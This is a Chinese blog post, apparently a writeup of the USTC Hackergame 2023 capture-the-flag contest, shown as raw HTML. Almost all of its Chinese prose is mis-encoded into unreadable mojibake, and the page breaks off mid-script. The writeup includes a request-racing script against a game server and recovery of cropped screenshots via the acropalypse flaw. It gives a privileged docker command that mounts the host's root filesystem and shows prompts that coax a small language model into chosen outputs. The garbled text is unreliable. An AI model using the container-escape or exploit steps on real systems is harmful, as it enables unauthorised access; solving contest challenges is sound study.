<!doctype html><html lang=zh dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>USTC Hackergame 2023 Writeup | Sparktour's Blog</title><meta name=keywords content="tech"><meta name=description content="è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œç¯å¢ƒå­¦çŸ¥è¯†ç›¸å…³å’ŒChatGPTçš„æ¨ªç©ºå‡ºä¸–ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚"><meta name=author content="sparktour"><link rel=canonical href=https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/><link crossorigin=anonymous href=/assets/css/stylesheet.f49d66caae9ea0fd43f21f29e71a8d3e284517ed770f2aa86fa012953ad3c9ef.css integrity="sha256-9J1myq6eoP1D8h8p5xqNPihFF+13Dyqob6ASlTrTye8=" rel="preload stylesheet" as=style><link rel=icon href=https://blog.sparktour.me/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.sparktour.me/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.sparktour.me/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.sparktour.me/apple-touch-icon.png><link rel=mask-icon href=https://blog.sparktour.me/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=zh href=https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://blog.sparktour.me/scss/callout.css><link rel=stylesheet href=https://s4.zstatic.net/ajax/libs/disqusjs/3.0.2/styles/disqusjs.css><script async src="https://www.googletagmanager.com/gtag/js?id=G-6EJ4YX1XZ8"></script><script>var doNotTrack=!1,dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-6EJ4YX1XZ8")}</script><meta property="og:url" content="https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/"><meta property="og:site_name" content="Sparktour's Blog"><meta property="og:title" content="USTC Hackergame 2023 Writeup"><meta property="og:description" content="è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œç¯å¢ƒå­¦çŸ¥è¯†ç›¸å…³å’ŒChatGPTçš„æ¨ªç©ºå‡ºä¸–ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚"><meta property="og:locale" content="zh"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2023-11-04T18:00:00+00:00"><meta property="article:modified_time" content="2024-04-18T21:09:32+08:00"><meta property="article:tag" content="Tech"><meta property="og:image" content="https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/score.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://assets.sparktour.me/img/blog/2023/ustc-hackergame-2023-writeup/score.png"><meta name=twitter:title content="USTC Hackergame 2023 Writeup"><meta name=twitter:description content="è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œç¯å¢ƒå­¦çŸ¥è¯†ç›¸å…³å’ŒChatGPTçš„æ¨ªç©ºå‡ºä¸–ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.sparktour.me/posts/"},{"@type":"ListItem","position":2,"name":"USTC Hackergame 2023 Writeup","item":"https://blog.sparktour.me/posts/2023/11/04/ustc-hackergame-2023-writeup/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"USTC Hackergame 2023 Writeup","name":"USTC Hackergame 2023 Writeup","description":"è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œç¯å¢ƒå­¦çŸ¥è¯†ç›¸å…³å’ŒChatGPTçš„æ¨ªç©ºå‡ºä¸–ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚\n","keywords":["tech"],"articleBody":"è¿™æ˜¯æœ¬äººç¬¬å››æ¬¡å‚åŠ USTCçš„hackergameäº†233ï¼Œæœ‰èµ–ä»Šå¹´è®¸å¤šé¢˜ç›®æ­£å¥½å’Œè¿ç»´å’Œç¯å¢ƒå­¦çŸ¥è¯†ç›¸å…³å’ŒChatGPTçš„æ¨ªç©ºå‡ºä¸–ï¼Œæœ¬äººçš„æ’åæ€»ç®—ç¬¬ä¸€æ¬¡è¿›äº†å‰100ã€‚\nåšå‡ºæ¥çš„éƒ¨åˆ† Hackergame å¯åŠ¨ https://cnhktrz3k5nc.hack-challenge.lug.ustc.edu.cn:13202/?similarity= æ³¨æ„åˆ°ç½‘é¡µæœ‰ä¸€ä¸ªsimilarity=çš„paramï¼Œæäº¤similarity=100å³å¯\nçŒ«å’ªå°æµ‹ æƒ³è¦å€Ÿé˜…ä¸–ç•Œå›¾ä¹¦å‡ºç‰ˆå…¬å¸å‡ºç‰ˆçš„ã€ŠA Classical Introduction To Modern Number Theory 2nd ed.ã€‹ï¼Œåº”å½“å‰å¾€ä¸­å›½ç§‘å­¦æŠ€æœ¯å¤§å­¦è¥¿åŒºå›¾ä¹¦é¦†çš„å“ªä¸€å±‚ï¼Ÿï¼ˆ30 åˆ†ï¼‰\nåœ¨USTCçš„å›¾ä¹¦é¦†ç½‘ç«™ä¸Šæ‰¾ä¹¦åï¼Œå³å¯çœ‹åˆ°è¿™æœ¬ä¹¦åœ¨â€œè¥¿åŒºå¤–æ–‡ä¹¦åº“â€ã€‚å†googleä¸€ä¸‹å°±èƒ½å‘ç°ä¹¦åº“åœ¨12å±‚ï¼š\nUSTCå›¾ä¹¦é¦†æŸ¥è¯¢åˆ°çš„å›¾ä¹¦ä½ç½®æˆªå›¾ ä»Šå¹´ arXiv ç½‘ç«™çš„å¤©ä½“ç‰©ç†ç‰ˆå—ä¸Šæœ‰äººå‘è¡¨äº†ä¸€ç¯‡å…³äºã€Œå¯è§‚æµ‹å®‡å®™ä¸­çš„é¸¡çš„å¯†åº¦ä¸Šé™ã€çš„è®ºæ–‡ï¼Œè¯·é—®è®ºæ–‡ä¸­ä½œè€…è®¡ç®—å‡ºçš„é¸¡å¯†åº¦å‡½æ•°çš„ä¸Šé™ä¸º 10 çš„å¤šå°‘æ¬¡æ–¹æ¯ç«‹æ–¹ç§’å·®è·ï¼Ÿ\ngoogleåæ‰¾åˆ°äº† ä½ è§è¿‡å“ªäº›æå“è®ºæ–‡ï¼Ÿ - çŸ¥ä¹ (zhihu.com)ï¼Œé‡Œé¢ç›´æ¥æåˆ°äº†æ˜¯23æ¬¡æ–¹ã€‚\nä¸ºäº†æ”¯æŒ TCP BBR æ‹¥å¡æ§åˆ¶ç®—æ³•ï¼Œåœ¨ç¼–è¯‘ Linux å†…æ ¸æ—¶åº”è¯¥é…ç½®å¥½å“ªä¸€æ¡å†…æ ¸é€‰é¡¹ï¼Ÿï¼ˆ20 åˆ†ï¼‰\ngoogle â€œtcp bbr kernel configâ€èƒ½æ‰¾åˆ°CONFIG_TCP_CONG_BBRã€‚\nğŸ¥’ğŸ¥’ğŸ¥’ï¼šã€Œæˆ‘â€¦â€¦ä»æ²¡è§‰å¾—å†™ç±»å‹æ ‡æ³¨æœ‰æ„æ€è¿‡ã€ã€‚åœ¨ä¸€ç¯‡è®ºæ–‡ä¸­ï¼Œä½œè€…ç»™å‡ºäº†èƒ½å¤Ÿè®© Python çš„ç±»å‹æ£€æŸ¥å™¨ MyPY mypy é™·å…¥æ­»å¾ªç¯çš„ä»£ç ï¼Œå¹¶è¯æ˜ Python çš„ç±»å‹æ£€æŸ¥å’Œåœæœºé—®é¢˜ä¸€æ ·å›°éš¾ã€‚è¯·é—®è¿™ç¯‡è®ºæ–‡å‘è¡¨åœ¨ä»Šå¹´çš„å“ªä¸ªå­¦æœ¯ä¼šè®®ä¸Šï¼Ÿ\næœmypy python type checking \"halting problem\"ï¼Œå°±èƒ½æ‰¾åˆ° https://drops.dagstuhl.de/opus/volltexte/2023/18237/pdf/LIPIcs-ECOOP-2023-44.pdf ï¼Œurlé‡Œå°±èƒ½çœ‹åˆ°ä¼šè®®å«ECOOPäº†ã€‚\næ›´æ·±æ›´æš— æ‰“å¼€elementsæœflag{å³å¯\næŸ¥çœ‹ç½‘é¡µå…ƒç´  æ—…è¡Œç…§ç‰‡ 3.0 **ä½ è¿˜è®°å¾—ä¸å­¦é•¿è§é¢è¿™å¤©æ˜¯å“ªä¸€å¤©å—ï¼Ÿï¼ˆæ ¼å¼ï¼šyyyy-mm-ddï¼‰**åƒæ‹‰é¢çš„ç…§ç‰‡å¯ä»¥çœ‹å‡ºâ€œå­¦é•¿â€å»çš„æ˜¯STATPHYS28 ï¼ˆhttps://statphys28.org/ï¼‰ï¼Œä¸€å¤©ä¸€å¤©è¯•å¯ä»¥è¯•å‡ºæ˜¯2023-08-10\n**åœ¨å­¦æ ¡è¯¥å±•å…å±•ç¤ºçš„æ‰€æœ‰åŒç§é‡‘è‰²å¥–ç‰Œçš„å¾—ä¸»ä¸­ï¼Œå‡ºç”Ÿæœ€æ™šè€…è·å¥–æ—¶æ‰€åœ¨çš„ç ”ç©¶æ‰€ç¼©å†™æ˜¯ä»€ä¹ˆï¼Ÿ**æ‰¾ä¸œäº¬å¤§å­¦è·å¾—è¯ºè´å°”å¥–çš„æ•™æˆï¼Œå¯ä»¥æ‰¾åˆ°æ¯”è¾ƒå¹´è½»çš„é‚£ä½æ˜¯Takaaki Kajita - Wikipediaï¼Œå·¥ä½œç ”ç©¶æ‰€æ˜¯ICRR\n**å¸ç¯·ä¸­æ´»åŠ¨æ‹›å‹Ÿå¿—æ„¿è€…æ—¶ç”¨äºæ”¶é›†æŠ¥åä¿¡æ¯çš„åœ¨çº¿é—®å·çš„ç¼–å·ï¼ˆä»¥å­—æ¯ S å¼€å¤´åæ¥æ•°å­—ï¼‰æ˜¯å¤šå°‘ï¼Ÿ**æ–‡ä¸­æåˆ°äº†â€œå½“ä½ ä»¬èµ°åˆ°ä¸€åº§åšç‰©é¦†å‰æ—¶ï¼Œ é©¬è·¯å¯¹é¢çš„å–·æ³‰å’Œå®ƒå‘¨å›´çš„æ™¯è‰²å¼•èµ·äº†ä½ çš„æ³¨æ„ã€‚â€ï¼Œåœ¨googleåœ°å›¾ä¸Šçš„ä¸Šé‡ç«™é™„è¿‘çœ‹äº†ä¸€ä¸‹ä¹‹åå‘ç°è¿™ä¸ªå–·æ³‰æ¯”è¾ƒæ¥è¿‘â€œä¸Šé‡å…¬å›­å¤§å–·æ°´â€ï¼Œæœç´¢â€œä¸Šé‡å…¬åœ’ ç«¹ã®å°åºƒå ´ (å™´æ°´åºƒå ´) 2023-08-10â€å¯ä»¥æœåˆ°ï¼”å¹´ã¶ã‚Šã®é–‹å‚¬ï¼ã€Œå…¨å›½æ¢…é…’ã¾ã¤ã‚Šinæ±äº¬2023ã€ã‚’ä¸Šé‡å…¬åœ’å™´æ°´åºƒå ´ã«ã¦é–‹å‚¬ï¼åŒ—ã‹ã‚‰å—ã¾ã§æ—¥æœ¬å…¨å›½ã®é…’è”µãŒé€ ã‚‹ç¾å‘³ã—ã„ã€Œæ¢…é…’ã€ï¼‘ï¼—ï¼ç¨®é¡ä»¥ä¸Šã‚’é£²ã¿æ¯”ã¹ã€‚ï½œä¸€èˆ¬ç¤¾å›£æ³•äººæ¢…é…’ç ”ç©¶ä¼šã®ãƒ—ãƒ¬ã‚¹ãƒªãƒªãƒ¼ã‚¹ (prtimes.jp)ï¼Œé‡Œé¢å°±èƒ½æ‰¾åˆ°å¿—æ„¿è€…çš„çš„æŠ¥åç½‘é¡µhttps://ws.formzu.net/dist/S495584522/ã€‚\nä¸Šé‡å…¬å›­çš„googleåœ°å›¾ å­¦é•¿è´­ä¹°è‡ªå·±çš„åšç‰©é¦†é—¨ç¥¨æ—¶ï¼ŒèŠ±è´¹äº†å¤šå°‘æ—¥å…ƒï¼Ÿä¸œäº¬å›½ç«‹åšç‰©é¦†å¤§å­¦ç”Ÿå…è´¹ï¼ˆ0ï¼‰\n**å­¦é•¿å½“å¤©æ™šä¸Šéœ€è¦åœ¨å“ªæ ‹æ ‡å¿—æ€§å»ºç­‘ç‰©çš„é™„è¿‘é›†åˆå‘¢ï¼Ÿ**æŸ¥STATPHYS28çš„ç½‘ç«™èƒ½æ‰¾åˆ°åœ¨é›†åˆåœ°ç‚¹åœ¨å®‰ç”°è®²å ‚ã€‚\n**è¿›ç«™æ—¶ï¼Œä½ åœ¨ JR ä¸Šé‡ç«™ä¸­å¤®æ£€ç¥¨å£å¤–çœ‹åˆ°ã€Œãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ã€æ´»åŠ¨æ­£åœ¨é”€å”®åŠ¨ç‰©å‘¨è¾¹å•†å“ï¼Œè¯¥æ´»åŠ¨å¼ è´´çš„ç²‰è‰²èƒŒæ™¯æµ·æŠ¥ä¸Šæ˜¯ä»€ä¹ˆåŠ¨ç‰©ï¼ˆè®°ä½œ Aï¼Œä¸¤ä¸ªæ±‰å­—ï¼‰ï¼Ÿ åœ¨å‡ºç«™å¤„é™„è¿‘å»ºç­‘çš„å±‹é¡¶å¹¿å‘Šç‰Œä¸Šï¼Œæ¯å°æ—¶éƒ½ä¼šé¡½çš®å‡ºç°çš„é‚£åª 3D åŠ¨ç‰©æ˜¯ä»€ä¹ˆå“ç§ï¼Ÿï¼ˆè®°ä½œ Bï¼Œä¸‰ä¸ªæ±‰å­—ï¼‰ï¼Ÿï¼ˆæ ¼å¼ï¼šA-Bï¼‰**æœãƒœã‚¿ãƒ³ï¼†ã‚«ãƒ•ãƒªãƒ³ã‚¯ã‚¹ ä¸Šé‡é§…èƒ½æœåˆ°è¿™ä¸ªinstagram postï¼Œé‡Œé¢æ˜¯ç†ŠçŒ«ï¼›ç”¨google lensè¯†åˆ«æœ€åä¸€å¼ å›¾èƒ½æœåˆ°è¿™ä¸ªè£…é¥°åœ¨Super Mario Bros.Shop ï¼Œåœ¨æ¸‹è°·é§…æ—è¾¹ï¼Œæœæ¸‹è°·é§… 3d åŠ¨ç‰©èƒ½æ‰¾åˆ°åŠ¨ç‰©æ˜¯ç§‹ç”°çŠ¬\ngoogle lensçš„è¯†åˆ«ç»“æœ èµ›åšäº•å­—æ£‹ ç†è®ºä¸Šè·Ÿæ­£ç¡®å®ç°ç®—æ³•çš„AIä¸‹æ£‹ï¼Œæœ€å¤šåªèƒ½å¹³å±€ã€‚å› æ­¤ç¿»é˜…jsï¼Œæ³¨æ„åˆ°äº†å®ƒå‘é€æ£‹ç›˜çš„è¯·æ±‚æ˜¯é˜»å¡çš„ï¼š\nasync run() { if (this.isRunning || this.queue.length === 0) { return; } this.isRunning = true; const { func, context, args, resolve, reject } = this.queue.shift(); try { const result = await func.apply(context, args); resolve(result); } catch (error) { reject(error); } this.isRunning = false; this.run(); } é‚£çŒœæµ‹ç›´æ¥å¿«é€Ÿå‘ä¸‹ä¸‰ä¸ªè¿èµ·æ¥çš„æ£‹ä½ç½®çš„è¯·æ±‚ï¼Œå°±èƒ½èµ¢äº†ï¼š\n# convert above curl to python requests url = 'http://202.38.93.111:10077' # create new session s = requests.Session() cookies = {'session': '.eJyr...'} # post with cookie and data {\"x\":\"1\",\"y\":\"1\"} # å‘é€çš„è¶³å¤Ÿå¿«å°±è¡Œ headers = {'Content-Type': 'application/json'} r = s.post(url, cookies=cookies, headers=headers, data='{\"x\":\"0\",\"y\":\"1\"}') r = s.post(url, cookies=cookies, headers=headers, data='{\"x\":\"1\",\"y\":\"1\"}') r = s.post(url, cookies=cookies, headers=headers, data='{\"x\":\"2\",\"y\":\"1\"}') print(r.text) # {\"board\":[[1,-1,0],[0,-1,0],[0,-1,0]],\"msg\":\"flag{I_can_eat_your_pieces_7843afed75}\"} å¥¶å¥¶çš„ç¡å‰ flag æ•…äº‹ é¢˜ç›®æåˆ°äº†è°·æ­Œçš„ã€äº²å„¿å­ã€(pixel)ï¼Œè¿ç³»ç»Ÿéƒ½æ²¡å¿ƒæ€å‡çº§ï¼Œæˆªå›¾ã€‚æœç´¢pixel screenshot cveèƒ½æœåˆ°NVD - CVE-2023-35671 (nist.gov)ï¼Œå³pixelçš„æˆªå›¾ç¨‹åºä¸ä¼šæŠŠè£å‰ªçš„éƒ¨åˆ†ä»æ•°æ®é‡Œåˆ é™¤ï¼Œæœ‰éšç§æ³„æ¼é£é™©ã€‚éšååœ¨ç½‘ä¸Šæ‰¾åˆ°äº†acropalypse pocçš„ç½‘é¡µå®ç°ï¼ŒæŠŠå›¾ä¼ ä¸Šå»ï¼Œè®¾ç½®é•¿å®½ä¸º1080*2400å³å¯æ¢å¤ï¼š\næ¢å¤åçš„æˆªå›¾ ç»„å§”ä¼šæ¨¡æ‹Ÿå™¨ ç¬¬ä¸€æ¬¡è¯·æ±‚å°±ä¼šæ‹¿åˆ°è¿™1000æ¡æ¶ˆæ¯çš„åˆ—è¡¨ï¼Œç„¶åæ ¹æ®æ¶ˆæ¯å‘å‡ºçš„delayå‘æ’¤å›çš„è¯·æ±‚å°±è¡Œï¼š\nurl = 'http://202.38.93.111:10021/api/getMessages' def send_callback(msgid): url = \"http://202.38.93.111:10021/api/deleteMessage\" headers = {'Content-Type': 'application/json'} data = {'id': msgid} response = requests.post(url, cookies=cookies, headers=headers, data=json.dumps(data)) # print resp print(response.text) # create new request session session = requests.Session() response = session.post(url, cookies=cookies) # dump to json resp_json = response.json() start_time = time.time() item_id = 0 for item in resp_json['messages']: # è®¡ç®—è‡ªä¸Šä¸€ä¸ªæ¡ç›®ä»¥æ¥å·²ç»è¿‡å»çš„æ—¶é—´ elapsed_time = time.time() - start_time # è®¡ç®—è¿˜éœ€è¦ç­‰å¾…å¤šé•¿æ—¶é—´ delay = item['delay'] - elapsed_time if delay \u003e 0: time.sleep(delay) text = item['text'] match = re.search(r'hack\\[([a-zA-Z]*)\\]', text) if match: print(delay, text) # id is the index of the message id = item_id send_callback(id) item_id += 1 # sleep 3 seconds time.sleep(3) flag_resp = session.post('http://202.38.93.111:10021/api/getflag', cookies=cookies) print(flag_resp.text) #{\"flag\":\"flag{Web_pr0gra_mm1ng_9386f773ee_15fun}\",\"success\":true} è™« å¬èµ·æ¥å¾ˆåƒæ˜¯è§£SSTVçš„é¢˜ç›®ï¼Œåœ¨ç½‘ä¸Šæ‰¾äº†https://github.com/colaclanth/sstv.gitç›´æ¥è½¬æ¢å°±èƒ½è§£å‡ºäº†ï¼š\nresult-sstv JSON âŠ‚ YAML? JSON âŠ„ YAML 1.1 åœ¨What valid JSON files are not valid YAML 1.1 files? - Stack Overflowæ‰¾åˆ°äº†12345e999ã€‚\nJSON âŠ„ YAML 1.2 ç¿»åˆ°äº†I accidentally used YAML.parse instead of JSON.parse and it worked | Hacker News (ycombinator.com)å’ŒYAML Ainâ€™t Markup Language (YAMLâ„¢) Version 1.2ï¼Œä»–ä»¬æåˆ°äº†ï¼š\nJSONâ€™s RFC4627 requires that mappings keys merely â€œSHOULDâ€ be unique, while YAML insists they â€œMUSTâ€ be. Technically, YAML therefore complies with the JSON spec, choosing to treat duplicates as an error. In practice, since JSON is silent on the semantics of such duplicates, the only portable JSON files are those with unique keys, which are therefore valid YAML files.\né‚£æ„é€ ä¸€ä¸ªæœ‰ä¸¤ä¸ªä¸€æ ·çš„keyçš„jsonå°±è¡Œï¼š\n{\"a\": 1,\"a\": 1} Git? Git! # git reflog ea49f0c (HEAD -\u003e main) HEAD@{0}: commit: Trim trailing spaces 15fd0a1 (origin/main, origin/HEAD) HEAD@{1}: reset: moving to HEAD~ 505e1a3 HEAD@{2}: commit: Trim trailing spaces 15fd0a1 (origin/main, origin/HEAD) HEAD@{3}: clone: from https://github.com/dair-ai/ML-Course-Notes.git # git reset --hard 505e1a3 ä¸€ä¸ªä¸€ä¸ªæ‰¾å°±èƒ½çœ‹åˆ°README.mdé‡Œæœ‰ äº†\nHTTP é›†é‚®å†Œ [100, 200, 206, 304, 400, 404, 405, 412, 413, 414, 416, 505] æ²¡æœ‰çŠ¶æ€â€¦â€¦å“ˆï¼Ÿï¼ˆéé¢„æœŸï¼‰ ç”¨CONNECT/TRACEä¼¼ä¹éƒ½å¯ä»¥åšåˆ°ï¼ˆåšçš„æ—¶å€™æƒ³èµ·æ¥äº†â€œHTTPä»£ç†â€ï¼‰\nCONNECT / \\r\\nHost: a.com\\r\\n\\r\\n 5/12 ç§çŠ¶æ€ç  100 Continue GET / HTTP/1.1\\r\\n Expect: 100-continue\\r\\n Host: example.com\\r\\n\\r\\n 200 OK GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 206 Partial Content è¯»å–ä¸€ä¸ªæ–‡ä»¶çš„éƒ¨åˆ†åŒºé—´\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n Connection: close\\r\\n\\r\\n 304 Not Modified è‡ªæŸä¸ªetagåæ²¡æœ‰ä¿®æ”¹è¿‡\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-None-Match: \"64dbafc8-267\"\\r\\n Connection: close\\r\\n\\r\\n 400 Bad Request HTTPæ¢æˆä¹±ä¸ƒå…«ç³Ÿçš„ä¸œè¥¿å°±è¡Œ\nGET / FOO/1.1\\r\\n Host: example.com\\r\\n Connection: close\\r\\n\\r\\n 404 Not Found GET /notexist HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed åœ¨ä¸æ”¯æŒPOSTçš„åœ°æ–¹POST\nPOST / HTTP/1.1\\r\\n Host: example.com\\r\\n Connection: close\\r\\n\\r\\n 412 Precondition Failed å’Œ304ç±»ä¼¼ï¼Œä½†æ—¶é—´å–ä¸€ä¸ªå¾ˆä¹…ä»¥å‰ï¼ˆæ–‡ä»¶åˆ›å»ºä¹‹å‰ï¼‰çš„æ—¶é—´\nGET /index.html HTTP/1.1\\r\\n Host: example.com\\r\\n If-Unmodified-Since: Sun, 15 Apr 2018 20:00:00 GMT\\r\\n\\r\\n 413 Payload Too Large è®¾ç½®ä¸€ä¸ªè¿‡é•¿çš„Content-Length\nGET / HTTP/1.1\\r\\n Content-Length: 10000000000\\r\\n Host: example.com\\r\\n\\r\\n 414 URI Too Long è®¾ç½®ä¸€ä¸ªè¿‡é•¿çš„URLï¼ˆåœ¨é»˜è®¤é…ç½®é‡Œæ˜¯å¤§äº8192å­—èŠ‚çš„æ ·å­ï¼‰\nGET /long-url-over-8000-words/ HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 416 Range Not Satisfiable å’Œ206ç±»ä¼¼ï¼Œä½†å–ä¸€ä¸ªä¸å­˜åœ¨çš„range\nGET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=999-9999\\r\\n Connection: close\\r\\n\\r\\n 505 HTTP Version Not Supported å‘æœåŠ¡å™¨ä¸è®¤è¯†çš„httpç‰ˆæœ¬\nGET / HTTP/114514\\r\\n Host: example.com\\r\\n Connection: close\\r\\n\\r\\n Docker for Everyone ç”¨--privilegedå¯åŠ¨dockerå¹¶æŠŠæ ¹ç›®å½•æŒ‚è¿›dockeræ‰¾å°±å¯ä»¥äº†ï¼š\ndocker run -it -v /:/host-root â€”-privileged alpine æŒ‚è½½æ ¹ç›®å½• æƒœå­—å¦‚é‡‘ 2.0 ç”Ÿæˆcod_dictçš„é‚£éƒ¨ä»½æ¯è¡Œåªæœ‰23ä¸ªcharï¼Œé‚£ç†è®ºä¸Šæ¯è¡Œåªè¦åŠ ä¸€ä¸ªcharå°±è¡Œäº†ï¼Œç„¶åç¡¬å‡‘å°±å¯ä»¥ï¼ˆå¯ä»¥é€šè¿‡å‰é¢çš„flag{å’Œåé¢çš„}å·æ¥å¯»æ‰¾ç¼ºçš„éƒ¨åˆ†å¤§æ¦‚åº”è¯¥æ’å…¥åœ¨ä»€ä¹ˆä½ç½®ã€‚\né«˜é¢‘ç‡æ˜Ÿçƒ å…ˆæŠŠasciinemaçš„å½•åˆ¶æ–‡ä»¶è¾“å‡ºåˆ°æ–‡æœ¬ï¼Œç„¶åæ›¿æ¢æ‰é‚£äº›é‡å å’Œçœ‹èµ·æ¥åƒæ˜¯ä¹±ç çš„éƒ¨åˆ†ï¼Œå¯ä»¥ç”¨jsæ£€æŸ¥å™¨æ£€æŸ¥ä¸€ä¸‹ï¼ˆæˆ–è€…ç”¨asciinemaå½•åˆ¶æœ€å¼€å¤´çš„æ—¶å€™æåˆ°çš„sha256ï¼‰\nasciinema play /Users/cyf/Downloads/hackergame-23/asciinema_restore.rec \u003e output.txt æ£€æŸ¥å¥½äº†è¿è¡Œjså³å¯ï¼š\n#node op.js flag{y0u_cAn_ReSTorE_C0de_fr0m_asc11nema_3db2da1063300e5dabf826e40ffd016101458df23a371} å°å‹å¤§è¯­è¨€æ¨¡å‹æ˜Ÿçƒ You Are Smart # input John likes to repeat what other saying. One day, Julia says \"you are smart\" to john, and John replied: # reply \"you are smart, too\". They both laugh and hug each other. John and Julia have been playing together all day, and they are ğŸ‘ğŸ‘ğŸ‘ flag1: flag{I-thINk-yOU-@rE-rEaLlY-rE4L1Y-Sm@RT} ğŸ‘ğŸ‘ğŸ‘ Accepted ä»TinyStories-train.txt Â· roneneldan/TinyStories at main (huggingface.co)ä¸‹è½½ä¸€ä¸‹trainçš„è®­ç»ƒé›†ï¼Œç„¶ååœ¨è®­ç»ƒé›†é‡Œæ‰¾å‡ºacceptedå‰é¢çš„8ä¸ªcharï¼Œä¸€ä¸ªä¸€ä¸ªè¾“å…¥æ¨¡å‹è¯•ã€‚\nfrom transformers import AutoModelForCausalLM, AutoTokenizer, GenerationConfig import torch import pickle from tqdm.notebook import trange, tqdm device = \"cuda:0\" if torch.cuda.is_available() else \"cpu\" model = AutoModelForCausalLM.from_pretrained('./TinyStories-33M') model = model.to(device) tokenizer = AutoTokenizer.from_pretrained(\"./TinyStories-33M\") # load counts_lst.pkl with open('./counts_lst.pkl', 'rb') as f: counts_lst = pickle.load(f) for i in trange(len(counts_lst)): prompt = counts_lst[i][0][0:7] input_ids = tokenizer.encode(prompt, return_tensors=\"pt\").to(device) output = model.generate(input_ids, num_beams=1, max_new_tokens=30,pad_token_id=tokenizer.eos_token_id) output_text = tokenizer.decode(output[0], skip_special_tokens=True) # if output contains \"accepted\", print it if \"accepted\" in output_text: print(prompt) print(output_text) print() èƒ½æ‰¾åˆ°ä»¥ä¸‹çš„è¾“å…¥è¾“å‡ºå¯¹ï¼š\natively atively accepted the challenge. The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed Apology Apology accepted. She was so happy and excited. She thanked the old man and ran off to show her friends her new toy. The moral of éšæ„è¾“å…¥ä¸€ä¸ªè¿›ç½‘é¡µå³å¯ï¼š\n# input atively # reply accepted the challenge. The little girl was so excited. She had never been asked to do something like this before. She was determined to succeed ğŸ‰ğŸ‰ğŸ‰ flag2: flag{yOU-@R3-@cCepT3D-tO-C0nt1Nu3-THe-g4M3} ğŸ‰ğŸ‰ğŸ‰ æµå¼æ˜Ÿçƒ ä»é¢˜ç›®ç»™çš„è½¬æ¢è„šæœ¬æ¥çœ‹ï¼Œè½¬æ¢è„šæœ¬æŠŠè¾“å…¥çš„è§†é¢‘è½¬æ¢æˆäº†ä¸€ä¸ªn*1çš„numpyæ•°ç»„ï¼Œå› æ­¤å¯ä»¥å†™ä¸€ä¸ªå‡½æ•°ä»è¿™ä¸ªæ•°ç»„é‡Œè½¬æ¢å›å¸§ï¼ˆæ³¨æ„é¢œè‰²é€šé“è¿˜è¦å ç”¨*3ï¼‰ã€‚è¿™ä¸ªè„šæœ¬æ˜¯ç¬”è€…åœ¨å†™äº†æ¡†æ¶ä¹‹åè¯·chatgptå†™çš„ï¼Œæ•ˆæœæ„å¤–çš„ä¸é”™ï¼ˆè‡³å°‘èƒ½ç”¨ï¼‰\nimport cv2 import numpy as np # Path to the binary file binary_file_path = \"video.bin\" # Reading the content of the binary file with open(binary_file_path, \"rb\") as f: video_data = np.frombuffer(f.read(), dtype=np.uint8) def restore_video(data, frame_count, width, height, 